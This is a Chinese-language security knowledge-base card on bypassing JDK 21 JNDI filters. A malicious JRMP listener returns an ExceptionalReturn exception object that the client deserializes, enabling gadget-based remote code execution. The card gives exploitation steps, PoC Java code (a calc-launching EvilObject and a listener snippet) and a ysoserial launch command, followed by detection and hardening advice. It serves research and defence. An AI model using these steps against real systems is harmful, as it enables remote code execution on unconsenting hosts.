---
id: web-java-rmi-jrmp-exceptional-return-jndi-jdk21-bypass
title: JDK21 JNDI 过滤器绕过：恶意 JRMP listener 返回 ExceptionalReturn 异常对象触发客户端 readObject
type: scenario
domain: web
path: web/java/rmi
technique: jrmp-exceptional-return-jndi-jdk21-bypass
aliases:
- JDK21 JNDI 绕过
- JRMP ExceptionalReturn
- StreamRemoteCall executeCall 反序列化
- 恶意 JRMP listener
- BadAttributeValueExpException 包装 gadget
- trustSerialData 绕过
- factoriesFilter 绕过
tags:
- java
- jndi
- rmi
- jrmp
- deserialization
- bypass
- jdk21
- ysoserial
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: JDK 21（JNDI 限制生效版本；原文 JRMP listener 用 JDK 8u321 运行）
verification:
  verified_by: verifier-V284
  verified_at: '2026-11-08T05:17:21+08:00'
  notes: 已对照原文与全部5张图片核对：图1 NamingManagerHelper.getObjectInstance 新增 Predicate<Class<?>> factoryFilter、图2 调试 conn=TCPConnection、图3 listener 写 TransportConstants.ExceptionalReturn+UID+BadAttributeValueExpException(setFieldValue val,payload)、图4 ysoserial JRMPListener 在 JDK 1.8.0_321 运行监听1234、图5 Client InitialContext.lookup(rmi://localhost:1234/any_is_ok) 弹出计算器且栈含 RegistryContext.lookup/BadAttributeValueExpException(ysoserial.payloads.EvilObject)，与原文及卡片一致。路径 web/java/rmi 经 kb path-check 返回 exists（含 README），路径合法。affected_versions 按原文 JDK21 保留并注明 listener 用 JDK 8u321。dedup top 候选 LDAP local factory/Hessian/BeanFactory 均为 related 不同 sink；dup-scan 与 14716 为 related，保留。PoC 未复跑。
---

## 一句话结论

JDK 21 在 JNDI 侧堵住了两条老路：LDAP 的 `Obj.decodeObject` 增加 `VersionHelper.isSerialDataAllowed()`（`trustSerialData` 默认 false），不再反序列化 `serializedData`/`javaRemoteLocation`；RMI 的 `NamingManagerHelper.getObjectInstance` 增加 `ObjectFactoriesFilter::checkRmiFilter`，默认只允许 `jdk.naming.rmi/com.sun.jndi.rmi.**;!*` 下的工厂类。但客户端执行 `InitialContext.lookup("rmi://attacker/...")` 时仍会走 `RegistryImpl_Stub.lookup → UnicastRef.invoke → StreamRemoteCall.executeCall()`；恶意 JRMP listener 只要在返回头写入 `TransportConstants.ExceptionalReturn` 并跟一个序列化异常对象，`executeCall` 就会在 JNDI 过滤逻辑之外直接 `in.readObject()`，用 `BadAttributeValueExpException` 等包装 gadget 即可触发反序列化 RCE。

## 原理

- **JDK21 的 LDAP 限制**：`com.sun.jndi.ldap.Obj.decodeObject` 在读取 `javaSerializedData`（属性 1）和 `javaRemoteLocation`（属性 7）前都检查 `VersionHelper.isSerialDataAllowed()`；该方法返回 `trustSerialData`，默认 false 时抛出 `NamingException("Object deserialization is not allowed")`。因此向 LDAP 响应塞序列化对象的经典打法失效。
- **JDK21 的 RMI 工厂限制**：`NamingManager.getObjectInstance` 委托给新的 `NamingManagerHelper.getObjectInstance(obj, name, ctx, env, ObjectFactoriesFilter::checkRmiFilter)`；`checkRmiFilter` 使用系统属性 `jdk.jndi.object.factoriesFilter`（默认 `jdk.naming.rmi/com.sun.jndi.rmi.**;!*`）做类名白名单，只有 `jdk.naming.rmi` 模块下的 `com.sun.jndi.rmi.*` 类能作为 `ObjectFactory` 被反射调用，任意本地工厂类（BeanFactory、Tomcat ResourceFactory 等）被拒。
- **未被覆盖的 RMI transport 路径**：JNDI 的 RMI provider 在 `RegistryContext.lookup` 中调用 `RegistryImpl_Stub.lookup`，stub 通过 `UnicastRef.invoke` 建立 JRMP 连接，最终进入 `sun.rmi.transport.StreamRemoteCall.executeCall()`。该方法读取服务端返回头后，若 `returnType == TransportConstants.ExceptionalReturn`，直接执行 `ex = in.readObject()` 把“异常对象”反序列化，然后才判断它是否为 `Exception`。
- **为什么能绕过**：`in.readObject()` 发生在 JRMP 传输层，不经过 JNDI 的 `decodeObject`（LDAP 属性解析）也不经过 `NamingManagerHelper`（对象工厂白名单）。JDK21 的两个过滤器只覆盖“JNDI 对象/属性”层，没有禁止 RMI 客户端反序列化对端返回的异常对象。
- **投递包装**：恶意 JRMP listener 按 JRMP 协议返回 `ExceptionalReturn` + `UID` + 一个 `BadAttributeValueExpException`，其 `val` 字段通过反射填入 gadget 对象；客户端反序列化该异常时会递归反序列化 `val`，触发 gadget 的 `readObject`（原文用 `EvilObject.readObject` 执行 `calc` 演示）。
- **前提**：客户端 classpath 上存在可利用的 gadget 类（真实攻击用 ysoserial 链，原文的 `EvilObject` 是便于演示的自定义链）；客户端允许访问攻击者的 RMI 端口，且未启用 `jdk.serialFilter` 等全局反序列化白名单。

## 触发条件

- 目标为 JDK 21（或同样启用 `trustSerialData=false`/RMI factoriesFilter 的版本），但业务仍接受用户可控的 JNDI/RMI URL；
- 客户端执行 `InitialContext.lookup("rmi://<attacker>:<port>/<name>")`，且能连到攻击者的 JRMP listener；
- 攻击者能按 JRMP 协议返回 `ExceptionalReturn`，并能控制异常对象图中的 gadget 类；
- 客户端 classpath 存在可用反序列化链（CC、CB、Hibernate 等），且未被 `jdk.serialFilter`/序列化防火墙拦截。

## 利用步骤

1. 准备恶意 JRMP listener（ysoserial `JRMPListener` 或自行实现），监听如 `1234`，绑定一条可用 gadget 链。
2. listener 接受客户端 lookup 后，写返回头：`writeByte(TransportConstants.ExceptionalReturn)`、`new UID().write(oos)`。
3. 构造 `BadAttributeValueExpException`，通过反射把 `val` 字段设为 gadget 对象（或用其他异常/集合包装），`oos.writeObject(ex)` 发给客户端。
4. 诱导/触发目标执行 `InitialContext.lookup("rmi://attacker:1234/any_is_ok")`；调用链为 `RegistryContext.lookup → RegistryImpl_Stub.lookup → UnicastRef.invoke → StreamRemoteCall.executeCall`。
5. `executeCall` 在 `ExceptionalReturn` 分支 `in.readObject()`，异常对象及其 `val` 被反序列化，gadget `readObject` 执行命令。
6. 若客户端返回 `Return` 而非 `ExceptionalReturn`，需检查 listener 是否按 JRMP 协议写入正确的 return code/UID；若客户端是 JDK 8，还需注意 `BadAttributeValueExpException.readObject` 对 `val.toString()` 的调用差异。

## PoC

原文演示代码（仅用于授权测试/研究，未在本机执行）：

```java
// 客户端：JNDI lookup 指向恶意 JRMP listener
import javax.naming.Context;
import javax.naming.InitialContext;

public class Client {
    public static void main(String[] args) throws Exception {
        String uri = "rmi://localhost:1234/any_is_ok";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}
```

```java
// 演示用 gadget：readObject 即执行命令（真实攻击替换为 ysoserial 链）
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class EvilObject implements Serializable {
    private void readObject(ObjectInputStream s) throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```

```java
// 恶意 JRMP listener 返回 ExceptionalReturn + 包装异常
oos.writeByte(TransportConstants.ExceptionalReturn);
new UID().write(oos);

BadAttributeValueExpException ex = new BadAttributeValueExpException(null);
Reflections.setFieldValue(ex, "val", payload);   // payload 为 gadget 对象
oos.writeObject(ex);
```

启动方式：`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 <gadget>`（原文用 JDK 8u321 运行 listener），再运行 Client 触发。

## 变体与关联

- **变体**：异常包装可换成 `BadAttributeValueExpException`、`EventListenerList`、集合/Map 等任意可在反序列化时触达 gadget 的对象；JRMP listener 也可返回 `NormalReturn` 后由后续调用触发其他反序列化点。
- **变体**：入口不一定是显式 `InitialContext.lookup`；只要业务把用户可控字符串交给 JNDI（DataSource、JMS、RMI stub 等）即可。
- **变体**：JDK21 其他 JNDI 绕过路线包括 Reference-only + 本地工厂（BeanFactory/ELProcessor、Tomcat ResourceFactory + JDBC、Druid/H2 INIT、Hessian 等），与本卡的 JRMP 传输层绕过互补。
- **关联**：[[web-java-deser-hessian-jndi-reference-only-unixprintservice]]（JDK 21 trustSerialData 绕过：Reference-only + HessianProxyFactory）、[[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]（本地工厂 ResourceFactory 绕过）、[[web-java-deserialization-jndi-druid-datasource-factory-h2-init]]（DruidDataSourceFactory 本地工厂）、[[web-java-deserialization-jndi-high-version-beanfactory-el]]（BeanFactory + EL）、[[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]]（低版本远程 codebase 对照）、[[web-java-deser-hibernate-activatableref-jrmp-secondary-bypass]]（JRMP 二次反序列化绕过黑名单）。

## 检测与防御

- **网络侧**：限制应用服务器向不可信地址发起 RMI/JRMP 连接（默认端口 1099 及任意自定义端口）；对出站 RMI 做目的地址白名单；监控 `InitialContext.lookup` 使用用户可控 URL 的日志。
- **JNDI 配置**：设置 `com.sun.jndi.rmi.object.trustURLCodebase=false`、`com.sun.jndi.ldap.object.trustURLCodebase=false`（新版本默认 false）；JDK21 保持 `trustSerialData=false` 与 RMI factoriesFilter 默认值，不因兼容性放开。
- **全局反序列化防护**：配置 JEP 290 `jdk.serialFilter`（类白名单/黑名单、深度/数组长度限制），部署序列化防火墙；对来自 RMI 对端的异常对象同样生效（这是本卡的关键补充，单靠 JNDI 过滤器不够）。
- **代码审计**：搜索 `InitialContext.lookup`、`Context.lookup`、`NamingManager.getObjectInstance` 的用户可控输入；禁止把外部输入直接作为 JNDI URL。
- **检测**：JRMP 返回 `ExceptionalReturn` 后客户端 `readObject` 异常类，属于异常行为；EDR/Java Agent 可 hook `StreamRemoteCall.executeCall` 或 `ObjectInputStream.readObject`，对反序列化异常对象的调用栈（`sun.rmi.transport.StreamRemoteCall`）告警。
- **加固**：升级 JDK 并跟进 JNDI/序列化修复；最小化 classpath 上的 gadget 依赖；对 RMI 服务启用认证/绑定回环地址，避免暴露 Registry。
